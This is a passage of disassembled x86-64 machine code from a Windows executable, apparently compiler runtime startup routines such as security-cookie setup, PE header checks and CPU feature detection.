   140001774:	74 12                	je     0x140001788
   140001776:	45 33 c0             	xor    %r8d,%r8d
   140001779:	41 8d 50 02          	lea    0x2(%r8),%edx
   14000177d:	33 c9                	xor    %ecx,%ecx
   14000177f:	48 8b 03             	mov    (%rbx),%rax
   140001782:	ff 15 88 88 01 00    	call   *0x18888(%rip)        # 0x14001a010
   140001788:	e8 2b 04 00 00       	call   0x140001bb8
   14000178d:	48 8b d8             	mov    %rax,%rbx
   140001790:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001794:	74 14                	je     0x1400017aa
   140001796:	48 8b c8             	mov    %rax,%rcx
   140001799:	e8 06 01 00 00       	call   0x1400018a4
   14000179e:	84 c0                	test   %al,%al
   1400017a0:	74 08                	je     0x1400017aa
   1400017a2:	48 8b 0b             	mov    (%rbx),%rcx
   1400017a5:	e8 86 0f 00 00       	call   0x140002730
   1400017aa:	e8 f5 1a 00 00       	call   0x1400032a4
   1400017af:	48 8b f8             	mov    %rax,%rdi
   1400017b2:	e8 89 0e 00 00       	call   0x140002640
   1400017b7:	48 8b 18             	mov    (%rax),%rbx
   1400017ba:	e8 79 0e 00 00       	call   0x140002638
   1400017bf:	4c 8b c7             	mov    %rdi,%r8
   1400017c2:	48 8b d3             	mov    %rbx,%rdx
   1400017c5:	8b 08                	mov    (%rax),%ecx
   1400017c7:	e8 d4 f9 ff ff       	call   0x1400011a0
   1400017cc:	8b d8                	mov    %eax,%ebx
   1400017ce:	e8 f5 03 00 00       	call   0x140001bc8
   1400017d3:	84 c0                	test   %al,%al
   1400017d5:	74 55                	je     0x14000182c
   1400017d7:	40 84 f6             	test   %sil,%sil
   1400017da:	75 05                	jne    0x1400017e1
   1400017dc:	e8 2f 0f 00 00       	call   0x140002710
   1400017e1:	33 d2                	xor    %edx,%edx
   1400017e3:	b1 01                	mov    $0x1,%cl
   1400017e5:	e8 fe 01 00 00       	call   0x1400019e8
   1400017ea:	8b c3                	mov    %ebx,%eax
   1400017ec:	eb 19                	jmp    0x140001807
   1400017ee:	8b d8                	mov    %eax,%ebx
   1400017f0:	e8 d3 03 00 00       	call   0x140001bc8
   1400017f5:	84 c0                	test   %al,%al
   1400017f7:	74 3b                	je     0x140001834
   1400017f9:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   1400017fe:	75 05                	jne    0x140001805
   140001800:	e8 1b 0f 00 00       	call   0x140002720
   140001805:	8b c3                	mov    %ebx,%eax
   140001807:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000180c:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001811:	48 83 c4 30          	add    $0x30,%rsp
   140001815:	5f                   	pop    %rdi
   140001816:	c3                   	ret
   140001817:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000181c:	e8 13 04 00 00       	call   0x140001c34
   140001821:	90                   	nop
   140001822:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001827:	e8 08 04 00 00       	call   0x140001c34
   14000182c:	8b cb                	mov    %ebx,%ecx
   14000182e:	e8 c5 0e 00 00       	call   0x1400026f8
   140001833:	90                   	nop
   140001834:	8b cb                	mov    %ebx,%ecx
   140001836:	e8 c9 0e 00 00       	call   0x140002704
   14000183b:	90                   	nop
   14000183c:	48 83 ec 28          	sub    $0x28,%rsp
   140001840:	e8 5b 02 00 00       	call   0x140001aa0
   140001845:	48 83 c4 28          	add    $0x28,%rsp
   140001849:	e9 72 fe ff ff       	jmp    0x1400016c0
   14000184e:	cc                   	int3
   14000184f:	cc                   	int3
   140001850:	48 83 ec 28          	sub    $0x28,%rsp
   140001854:	e8 0f 00 00 00       	call   0x140001868
   140001859:	48 f7 d8             	neg    %rax
   14000185c:	1b c0                	sbb    %eax,%eax
   14000185e:	f7 d8                	neg    %eax
   140001860:	ff c8                	dec    %eax
   140001862:	48 83 c4 28          	add    $0x28,%rsp
   140001866:	c3                   	ret
   140001867:	cc                   	int3
   140001868:	40 53                	rex push %rbx
   14000186a:	48 83 ec 20          	sub    $0x20,%rsp
   14000186e:	48 83 3d 22 67 01 00 	cmpq   $0xffffffffffffffff,0x16722(%rip)        # 0x140017f98
   140001875:	ff 
   140001876:	48 8b d9             	mov    %rcx,%rbx
   140001879:	75 07                	jne    0x140001882
   14000187b:	e8 cc 16 00 00       	call   0x140002f4c
   140001880:	eb 0f                	jmp    0x140001891
   140001882:	48 8b d3             	mov    %rbx,%rdx
   140001885:	48 8d 0d 0c 67 01 00 	lea    0x1670c(%rip),%rcx        # 0x140017f98
   14000188c:	e8 37 16 00 00       	call   0x140002ec8
   140001891:	33 d2                	xor    %edx,%edx
   140001893:	85 c0                	test   %eax,%eax
   140001895:	48 0f 44 d3          	cmove  %rbx,%rdx
   140001899:	48 8b c2             	mov    %rdx,%rax
   14000189c:	48 83 c4 20          	add    $0x20,%rsp
   1400018a0:	5b                   	pop    %rbx
   1400018a1:	c3                   	ret
   1400018a2:	cc                   	int3
   1400018a3:	cc                   	int3
   1400018a4:	48 83 ec 18          	sub    $0x18,%rsp
   1400018a8:	4c 8b c1             	mov    %rcx,%r8
   1400018ab:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400018b0:	66 39 05 49 e7 ff ff 	cmp    %ax,-0x18b7(%rip)        # 0x140000000
   1400018b7:	75 78                	jne    0x140001931
   1400018b9:	48 63 0d 7c e7 ff ff 	movslq -0x1884(%rip),%rcx        # 0x14000003c
   1400018c0:	48 8d 15 39 e7 ff ff 	lea    -0x18c7(%rip),%rdx        # 0x140000000
   1400018c7:	48 03 ca             	add    %rdx,%rcx
   1400018ca:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400018d0:	75 5f                	jne    0x140001931
   1400018d2:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400018d7:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400018db:	75 54                	jne    0x140001931
   1400018dd:	4c 2b c2             	sub    %rdx,%r8
   1400018e0:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400018e4:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   1400018e8:	48 03 d0             	add    %rax,%rdx
   1400018eb:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400018ef:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400018f3:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400018f7:	48 89 14 24          	mov    %rdx,(%rsp)
   1400018fb:	49 3b d1             	cmp    %r9,%rdx
   1400018fe:	74 18                	je     0x140001918
   140001900:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140001903:	4c 3b c1             	cmp    %rcx,%r8
   140001906:	72 0a                	jb     0x140001912
   140001908:	8b 42 08             	mov    0x8(%rdx),%eax
   14000190b:	03 c1                	add    %ecx,%eax
   14000190d:	4c 3b c0             	cmp    %rax,%r8
   140001910:	72 08                	jb     0x14000191a
   140001912:	48 83 c2 28          	add    $0x28,%rdx
   140001916:	eb df                	jmp    0x1400018f7
   140001918:	33 d2                	xor    %edx,%edx
   14000191a:	48 85 d2             	test   %rdx,%rdx
   14000191d:	75 04                	jne    0x140001923
   14000191f:	32 c0                	xor    %al,%al
   140001921:	eb 14                	jmp    0x140001937
   140001923:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140001927:	7d 04                	jge    0x14000192d
   140001929:	32 c0                	xor    %al,%al
   14000192b:	eb 0a                	jmp    0x140001937
   14000192d:	b0 01                	mov    $0x1,%al
   14000192f:	eb 06                	jmp    0x140001937
   140001931:	32 c0                	xor    %al,%al
   140001933:	eb 02                	jmp    0x140001937
   140001935:	32 c0                	xor    %al,%al
   140001937:	48 83 c4 18          	add    $0x18,%rsp
   14000193b:	c3                   	ret
   14000193c:	48 83 ec 28          	sub    $0x28,%rsp
   140001940:	e8 b3 06 00 00       	call   0x140001ff8
   140001945:	85 c0                	test   %eax,%eax
   140001947:	74 21                	je     0x14000196a
   140001949:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001950:	00 00 
   140001952:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001956:	eb 05                	jmp    0x14000195d
   140001958:	48 3b c8             	cmp    %rax,%rcx
   14000195b:	74 14                	je     0x140001971
   14000195d:	33 c0                	xor    %eax,%eax
   14000195f:	f0 48 0f b1 0d 20 66 	lock cmpxchg %rcx,0x16620(%rip)        # 0x140017f88
   140001966:	01 00 
   140001968:	75 ee                	jne    0x140001958
   14000196a:	32 c0                	xor    %al,%al
   14000196c:	48 83 c4 28          	add    $0x28,%rsp
   140001970:	c3                   	ret
   140001971:	b0 01                	mov    $0x1,%al
   140001973:	eb f7                	jmp    0x14000196c
   140001975:	cc                   	int3
   140001976:	cc                   	int3
   140001977:	cc                   	int3
   140001978:	40 53                	rex push %rbx
   14000197a:	48 83 ec 20          	sub    $0x20,%rsp
   14000197e:	8a d9                	mov    %cl,%bl
   140001980:	e8 73 06 00 00       	call   0x140001ff8
   140001985:	33 d2                	xor    %edx,%edx
   140001987:	85 c0                	test   %eax,%eax
   140001989:	74 0b                	je     0x140001996
   14000198b:	84 db                	test   %bl,%bl
   14000198d:	75 07                	jne    0x140001996
   14000198f:	48 87 15 f2 65 01 00 	xchg   %rdx,0x165f2(%rip)        # 0x140017f88
   140001996:	48 83 c4 20          	add    $0x20,%rsp
   14000199a:	5b                   	pop    %rbx
   14000199b:	c3                   	ret
   14000199c:	40 53                	rex push %rbx
   14000199e:	48 83 ec 20          	sub    $0x20,%rsp
   1400019a2:	0f b6 05 e7 65 01 00 	movzbl 0x165e7(%rip),%eax        # 0x140017f90
   1400019a9:	85 c9                	test   %ecx,%ecx
   1400019ab:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400019b0:	0f 44 c3             	cmove  %ebx,%eax
   1400019b3:	88 05 d7 65 01 00    	mov    %al,0x165d7(%rip)        # 0x140017f90
   1400019b9:	e8 96 04 00 00       	call   0x140001e54
   1400019be:	e8 f5 08 00 00       	call   0x1400022b8
   1400019c3:	84 c0                	test   %al,%al
   1400019c5:	75 04                	jne    0x1400019cb
   1400019c7:	32 c0                	xor    %al,%al
   1400019c9:	eb 14                	jmp    0x1400019df
   1400019cb:	e8 1c 0c 00 00       	call   0x1400025ec
   1400019d0:	84 c0                	test   %al,%al
   1400019d2:	75 09                	jne    0x1400019dd
   1400019d4:	33 c9                	xor    %ecx,%ecx
   1400019d6:	e8 05 09 00 00       	call   0x1400022e0
   1400019db:	eb ea                	jmp    0x1400019c7
   1400019dd:	8a c3                	mov    %bl,%al
   1400019df:	48 83 c4 20          	add    $0x20,%rsp
   1400019e3:	5b                   	pop    %rbx
   1400019e4:	c3                   	ret
   1400019e5:	cc                   	int3
   1400019e6:	cc                   	int3
   1400019e7:	cc                   	int3
   1400019e8:	40 53                	rex push %rbx
   1400019ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400019ee:	80 3d 9b 65 01 00 00 	cmpb   $0x0,0x1659b(%rip)        # 0x140017f90
   1400019f5:	8a d9                	mov    %cl,%bl
   1400019f7:	74 04                	je     0x1400019fd
   1400019f9:	84 d2                	test   %dl,%dl
   1400019fb:	75 0c                	jne    0x140001a09
   1400019fd:	e8 fe 0b 00 00       	call   0x140002600
   140001a02:	8a cb                	mov    %bl,%cl
   140001a04:	e8 d7 08 00 00       	call   0x1400022e0
   140001a09:	b0 01                	mov    $0x1,%al
   140001a0b:	48 83 c4 20          	add    $0x20,%rsp
   140001a0f:	5b                   	pop    %rbx
   140001a10:	c3                   	ret
   140001a11:	cc                   	int3
   140001a12:	cc                   	int3
   140001a13:	cc                   	int3
   140001a14:	40 53                	rex push %rbx
   140001a16:	48 83 ec 20          	sub    $0x20,%rsp
   140001a1a:	80 3d 70 65 01 00 00 	cmpb   $0x0,0x16570(%rip)        # 0x140017f91
   140001a21:	8b d9                	mov    %ecx,%ebx
   140001a23:	75 67                	jne    0x140001a8c
   140001a25:	83 f9 01             	cmp    $0x1,%ecx
   140001a28:	77 6a                	ja     0x140001a94
   140001a2a:	e8 c9 05 00 00       	call   0x140001ff8
   140001a2f:	85 c0                	test   %eax,%eax
   140001a31:	74 28                	je     0x140001a5b
   140001a33:	85 db                	test   %ebx,%ebx
   140001a35:	75 24                	jne    0x140001a5b
   140001a37:	48 8d 0d 5a 65 01 00 	lea    0x1655a(%rip),%rcx        # 0x140017f98
   140001a3e:	e8 5d 14 00 00       	call   0x140002ea0
   140001a43:	85 c0                	test   %eax,%eax
   140001a45:	75 10                	jne    0x140001a57
   140001a47:	48 8d 0d 62 65 01 00 	lea    0x16562(%rip),%rcx        # 0x140017fb0
   140001a4e:	e8 4d 14 00 00       	call   0x140002ea0
   140001a53:	85 c0                	test   %eax,%eax
   140001a55:	74 2e                	je     0x140001a85
   140001a57:	32 c0                	xor    %al,%al
   140001a59:	eb 33                	jmp    0x140001a8e
   140001a5b:	66 0f 6f 05 ed c6 00 	movdqa 0xc6ed(%rip),%xmm0        # 0x14000e150
   140001a62:	00 
   140001a63:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001a67:	f3 0f 7f 05 29 65 01 	movdqu %xmm0,0x16529(%rip)        # 0x140017f98
   140001a6e:	00 
   140001a6f:	48 89 05 32 65 01 00 	mov    %rax,0x16532(%rip)        # 0x140017fa8
   140001a76:	f3 0f 7f 05 32 65 01 	movdqu %xmm0,0x16532(%rip)        # 0x140017fb0
   140001a7d:	00 
   140001a7e:	48 89 05 3b 65 01 00 	mov    %rax,0x1653b(%rip)        # 0x140017fc0
   140001a85:	c6 05 05 65 01 00 01 	movb   $0x1,0x16505(%rip)        # 0x140017f91
   140001a8c:	b0 01                	mov    $0x1,%al
   140001a8e:	48 83 c4 20          	add    $0x20,%rsp
   140001a92:	5b                   	pop    %rbx
   140001a93:	c3                   	ret
   140001a94:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001a99:	e8 96 01 00 00       	call   0x140001c34
   140001a9e:	cc                   	int3
   140001a9f:	cc                   	int3
   140001aa0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001aa5:	55                   	push   %rbp
   140001aa6:	48 8b ec             	mov    %rsp,%rbp
   140001aa9:	48 83 ec 20          	sub    $0x20,%rsp
   140001aad:	48 8b 05 84 55 01 00 	mov    0x15584(%rip),%rax        # 0x140017038
   140001ab4:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140001abb:	2b 00 00 
   140001abe:	48 3b c3             	cmp    %rbx,%rax
   140001ac1:	75 74                	jne    0x140001b37
   140001ac3:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140001ac8:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140001acc:	ff 15 86 3d 01 00    	call   *0x13d86(%rip)        # 0x140015858
   140001ad2:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001ad6:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140001ada:	ff 15 10 3d 01 00    	call   *0x13d10(%rip)        # 0x1400157f0
   140001ae0:	8b c0                	mov    %eax,%eax
   140001ae2:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001ae6:	ff 15 fc 3c 01 00    	call   *0x13cfc(%rip)        # 0x1400157e8
   140001aec:	8b c0                	mov    %eax,%eax
   140001aee:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001af2:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001af6:	ff 15 cc 3d 01 00    	call   *0x13dcc(%rip)        # 0x1400158c8
   140001afc:	8b 45 20             	mov    0x20(%rbp),%eax
   140001aff:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001b03:	48 c1 e0 20          	shl    $0x20,%rax
   140001b07:	48 33 45 20          	xor    0x20(%rbp),%rax
   140001b0b:	48 33 45 10          	xor    0x10(%rbp),%rax
   140001b0f:	48 33 c1             	xor    %rcx,%rax
   140001b12:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001b19:	ff 00 00 
   140001b1c:	48 23 c1             	and    %rcx,%rax
   140001b1f:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140001b26:	2b 00 00 
   140001b29:	48 3b c3             	cmp    %rbx,%rax
   140001b2c:	48 0f 44 c1          	cmove  %rcx,%rax
   140001b30:	48 89 05 01 55 01 00 	mov    %rax,0x15501(%rip)        # 0x140017038
   140001b37:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001b3c:	48 f7 d0             	not    %rax
   140001b3f:	48 89 05 ea 54 01 00 	mov    %rax,0x154ea(%rip)        # 0x140017030
   140001b46:	48 83 c4 20          	add    $0x20,%rsp
   140001b4a:	5d                   	pop    %rbp
   140001b4b:	c3                   	ret
   140001b4c:	33 c0                	xor    %eax,%eax
   140001b4e:	c3                   	ret
   140001b4f:	cc                   	int3
   140001b50:	b8 01 00 00 00       	mov    $0x1,%eax
   140001b55:	c3                   	ret
   140001b56:	cc                   	int3
   140001b57:	cc                   	int3
   140001b58:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001b5d:	c3                   	ret
   140001b5e:	cc                   	int3
   140001b5f:	cc                   	int3
   140001b60:	48 8d 0d 69 64 01 00 	lea    0x16469(%rip),%rcx        # 0x140017fd0
   140001b67:	48 ff 25 1a 3d 01 00 	rex.W jmp *0x13d1a(%rip)        # 0x140015888
   140001b6e:	cc                   	int3
   140001b6f:	cc                   	int3
   140001b70:	b0 01                	mov    $0x1,%al
   140001b72:	c3                   	ret
   140001b73:	cc                   	int3
   140001b74:	c2 00 00             	ret    $0x0
   140001b77:	cc                   	int3
   140001b78:	48 83 ec 28          	sub    $0x28,%rsp
   140001b7c:	e8 13 00 00 00       	call   0x140001b94
   140001b81:	48 83 08 24          	orq    $0x24,(%rax)
   140001b85:	e8 12 00 00 00       	call   0x140001b9c
   140001b8a:	48 83 08 02          	orq    $0x2,(%rax)
   140001b8e:	48 83 c4 28          	add    $0x28,%rsp
   140001b92:	c3                   	ret
   140001b93:	cc                   	int3
   140001b94:	48 8d 05 45 64 01 00 	lea    0x16445(%rip),%rax        # 0x140017fe0
   140001b9b:	c3                   	ret
   140001b9c:	48 8d 05 45 64 01 00 	lea    0x16445(%rip),%rax        # 0x140017fe8
   140001ba3:	c3                   	ret
   140001ba4:	33 c0                	xor    %eax,%eax
   140001ba6:	39 05 98 54 01 00    	cmp    %eax,0x15498(%rip)        # 0x140017044
   140001bac:	0f 94 c0             	sete   %al
   140001baf:	c3                   	ret
   140001bb0:	48 8d 05 41 64 01 00 	lea    0x16441(%rip),%rax        # 0x140017ff8
   140001bb7:	c3                   	ret
   140001bb8:	48 8d 05 41 64 01 00 	lea    0x16441(%rip),%rax        # 0x140018000
   140001bbf:	c3                   	ret
   140001bc0:	83 25 41 64 01 00 00 	andl   $0x0,0x16441(%rip)        # 0x140018008
   140001bc7:	c3                   	ret
   140001bc8:	48 83 ec 28          	sub    $0x28,%rsp
   140001bcc:	33 c9                	xor    %ecx,%ecx
   140001bce:	ff 15 4c 3c 01 00    	call   *0x13c4c(%rip)        # 0x140015820
   140001bd4:	48 85 c0             	test   %rax,%rax
   140001bd7:	74 3a                	je     0x140001c13
   140001bd9:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140001bde:	66 39 08             	cmp    %cx,(%rax)
   140001be1:	75 30                	jne    0x140001c13
   140001be3:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140001be7:	48 03 c8             	add    %rax,%rcx
   140001bea:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001bf0:	75 21                	jne    0x140001c13
   140001bf2:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001bf7:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001bfb:	75 16                	jne    0x140001c13
   140001bfd:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140001c04:	76 0d                	jbe    0x140001c13
   140001c06:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140001c0d:	74 04                	je     0x140001c13
   140001c0f:	b0 01                	mov    $0x1,%al
   140001c11:	eb 02                	jmp    0x140001c15
   140001c13:	32 c0                	xor    %al,%al
   140001c15:	48 83 c4 28          	add    $0x28,%rsp
   140001c19:	c3                   	ret
   140001c1a:	cc                   	int3
   140001c1b:	cc                   	int3
   140001c1c:	e9 2b ff ff ff       	jmp    0x140001b4c
   140001c21:	cc                   	int3
   140001c22:	cc                   	int3
   140001c23:	cc                   	int3
   140001c24:	48 8d 0d 55 01 00 00 	lea    0x155(%rip),%rcx        # 0x140001d80
   140001c2b:	48 ff 25 e6 3c 01 00 	rex.W jmp *0x13ce6(%rip)        # 0x140015918
   140001c32:	cc                   	int3
   140001c33:	cc                   	int3
   140001c34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c39:	55                   	push   %rbp
   140001c3a:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140001c41:	ff 
   140001c42:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140001c49:	8b d9                	mov    %ecx,%ebx
   140001c4b:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001c50:	ff 15 42 3c 01 00    	call   *0x13c42(%rip)        # 0x140015898
   140001c56:	85 c0                	test   %eax,%eax
   140001c58:	74 04                	je     0x140001c5e
   140001c5a:	8b cb                	mov    %ebx,%ecx
   140001c5c:	cd 29                	int    $0x29
   140001c5e:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001c63:	e8 58 ff ff ff       	call   0x140001bc0
   140001c68:	33 d2                	xor    %edx,%edx
   140001c6a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001c6e:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140001c74:	e8 b7 06 00 00       	call   0x140002330
   140001c79:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001c7d:	ff 15 55 3c 01 00    	call   *0x13c55(%rip)        # 0x1400158d8
   140001c83:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140001c8a:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140001c91:	48 8b cb             	mov    %rbx,%rcx
   140001c94:	45 33 c0             	xor    %r8d,%r8d
   140001c97:	ff 15 43 3c 01 00    	call   *0x13c43(%rip)        # 0x1400158e0
   140001c9d:	48 85 c0             	test   %rax,%rax
   140001ca0:	74 3c                	je     0x140001cde
   140001ca2:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001ca8:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140001caf:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140001cb6:	4c 8b c8             	mov    %rax,%r9
   140001cb9:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001cbe:	4c 8b c3             	mov    %rbx,%r8
   140001cc1:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140001cc8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001ccd:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001cd1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001cd6:	33 c9                	xor    %ecx,%ecx
   140001cd8:	ff 15 12 3c 01 00    	call   *0x13c12(%rip)        # 0x1400158f0
   140001cde:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001ce5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001cea:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140001cf1:	33 d2                	xor    %edx,%edx
   140001cf3:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140001cfa:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140001d00:	48 83 c0 08          	add    $0x8,%rax
   140001d04:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140001d0b:	e8 20 06 00 00       	call   0x140002330
   140001d10:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001d17:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001d1c:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140001d23:	40 
   140001d24:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140001d2b:	00 
   140001d2c:	ff 15 5e 3b 01 00    	call   *0x13b5e(%rip)        # 0x140015890
   140001d32:	83 f8 01             	cmp    $0x1,%eax
   140001d35:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001d3a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d3f:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140001d43:	0f 94 c3             	sete   %bl
   140001d46:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001d4b:	33 c9                	xor    %ecx,%ecx
   140001d4d:	ff 15 c5 3b 01 00    	call   *0x13bc5(%rip)        # 0x140015918
   140001d53:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001d58:	ff 15 ea 3b 01 00    	call   *0x13bea(%rip)        # 0x140015948
   140001d5e:	85 c0                	test   %eax,%eax
   140001d60:	75 0c                	jne    0x140001d6e
   140001d62:	84 db                	test   %bl,%bl
   140001d64:	75 08                	jne    0x140001d6e
   140001d66:	8d 48 03             	lea    0x3(%rax),%ecx
   140001d69:	e8 52 fe ff ff       	call   0x140001bc0
   140001d6e:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140001d75:	00 
   140001d76:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140001d7d:	5d                   	pop    %rbp
   140001d7e:	c3                   	ret
   140001d7f:	cc                   	int3
   140001d80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d85:	57                   	push   %rdi
   140001d86:	48 83 ec 20          	sub    $0x20,%rsp
   140001d8a:	48 8b 19             	mov    (%rcx),%rbx
   140001d8d:	48 8b f9             	mov    %rcx,%rdi
   140001d90:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140001d96:	75 1c                	jne    0x140001db4
   140001d98:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140001d9c:	75 16                	jne    0x140001db4
   140001d9e:	8b 53 20             	mov    0x20(%rbx),%edx
   140001da1:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   140001da7:	83 f8 02             	cmp    $0x2,%eax
   140001daa:	76 15                	jbe    0x140001dc1
   140001dac:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140001db2:	74 0d                	je     0x140001dc1
   140001db4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001db9:	33 c0                	xor    %eax,%eax
   140001dbb:	48 83 c4 20          	add    $0x20,%rsp
   140001dbf:	5f                   	pop    %rdi
   140001dc0:	c3                   	ret
   140001dc1:	e8 ca 04 00 00       	call   0x140002290
   140001dc6:	48 89 18             	mov    %rbx,(%rax)
   140001dc9:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140001dcd:	e8 d2 04 00 00       	call   0x1400022a4
   140001dd2:	48 89 18             	mov    %rbx,(%rax)
   140001dd5:	e8 fe 1a 00 00       	call   0x1400038d8
   140001dda:	cc                   	int3
   140001ddb:	cc                   	int3
   140001ddc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001de1:	57                   	push   %rdi
   140001de2:	48 83 ec 20          	sub    $0x20,%rsp
   140001de6:	48 8d 1d f3 40 01 00 	lea    0x140f3(%rip),%rbx        # 0x140015ee0
   140001ded:	48 8d 3d ec 40 01 00 	lea    0x140ec(%rip),%rdi        # 0x140015ee0
   140001df4:	eb 12                	jmp    0x140001e08
   140001df6:	48 8b 03             	mov    (%rbx),%rax
   140001df9:	48 85 c0             	test   %rax,%rax
   140001dfc:	74 06                	je     0x140001e04
   140001dfe:	ff 15 0c 82 01 00    	call   *0x1820c(%rip)        # 0x14001a010
   140001e04:	48 83 c3 08          	add    $0x8,%rbx
   140001e08:	48 3b df             	cmp    %rdi,%rbx
   140001e0b:	72 e9                	jb     0x140001df6
   140001e0d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001e12:	48 83 c4 20          	add    $0x20,%rsp
   140001e16:	5f                   	pop    %rdi
   140001e17:	c3                   	ret
   140001e18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e1d:	57                   	push   %rdi
   140001e1e:	48 83 ec 20          	sub    $0x20,%rsp
   140001e22:	48 8d 1d c7 40 01 00 	lea    0x140c7(%rip),%rbx        # 0x140015ef0
   140001e29:	48 8d 3d c0 40 01 00 	lea    0x140c0(%rip),%rdi        # 0x140015ef0
   140001e30:	eb 12                	jmp    0x140001e44
   140001e32:	48 8b 03             	mov    (%rbx),%rax
   140001e35:	48 85 c0             	test   %rax,%rax
   140001e38:	74 06                	je     0x140001e40
   140001e3a:	ff 15 d0 81 01 00    	call   *0x181d0(%rip)        # 0x14001a010
   140001e40:	48 83 c3 08          	add    $0x8,%rbx
   140001e44:	48 3b df             	cmp    %rdi,%rbx
   140001e47:	72 e9                	jb     0x140001e32
   140001e49:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001e4e:	48 83 c4 20          	add    $0x20,%rsp
   140001e52:	5f                   	pop    %rdi
   140001e53:	c3                   	ret
   140001e54:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001e59:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001e5e:	57                   	push   %rdi
   140001e5f:	48 83 ec 10          	sub    $0x10,%rsp
   140001e63:	33 c0                	xor    %eax,%eax
   140001e65:	33 c9                	xor    %ecx,%ecx
   140001e67:	0f a2                	cpuid
